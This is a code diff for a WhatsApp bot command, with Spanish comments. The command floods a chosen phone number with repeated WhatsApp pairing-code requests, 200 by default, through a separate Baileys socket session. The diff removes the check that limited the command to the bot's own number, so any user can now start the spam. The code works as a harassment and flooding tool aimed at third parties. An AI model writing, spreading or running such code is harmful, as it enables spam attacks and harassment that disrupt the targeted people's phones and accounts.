@@ -1,9 +1,4 @@
-let handler = async (m, { conn, text, command }) => {
-  const botNumber = conn.user.id.split(':')[0].replace(/[^0-9]/g, '');
-  const sender = m.sender.split(':')[0].replace(/[^0-9]/g, '');
-
-  if (botNumber !== sender) return m.reply('❌ Solo el bot puede ejecutar este comando.');
-
+let handler = async (m, { text, command }) => {
   if (!text) return m.reply(`📌 *Ejemplo:* ${command} +521234567890|150`);
 
   let [numeroRaw, repeticiones = "200"] = text.split("|");
@@ -12,12 +7,31 @@ let handler = async (m, { conn, text, command }) => {
   if (!target || target.length < 8) return m.reply('⚠️ Número inválido.');
   m.reply(`🚀 Iniciando spam de Pairing Code a: wa.me/${target}\n🔁 Repeticiones: ${repeticiones}`);
 
+  // Importar módulos necesarios
+  const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
+  const { version } = await fetchLatestBaileysVersion();
+  const { state, saveCreds } = await useMultiFileAuthState('spamsession');
+  const pino = require('pino');
+
+  // Crear conexión temporal
+  const tempConn = makeWaSocket({
+    auth: state,
+    version,
+    logger: pino({ level: 'silent' }),
+    printQRInTerminal: false,
+  });
+
+  // Guardar sesión en disco si cambia
+  tempConn.ev.on('creds.update', saveCreds);
+
+  // Función para delay
   const sleep = ms => new Promise(res => setTimeout(res, ms));
 
+  // Loop de envío de pairing codes
   for (let i = 0; i < Number(repeticiones); i++) {
     try {
       await sleep(1500);
-      let code = await conn.requestPairingCode(target);
+      let code = await tempConn.requestPairingCode(target);
       console.log(`[SPAM ${i + 1}] Pairing Code enviado a ${target}: ${code}`);
     } catch (e) {
       console.log(`[ERROR] Fallo en intento ${i + 1}: ${e.message}`);
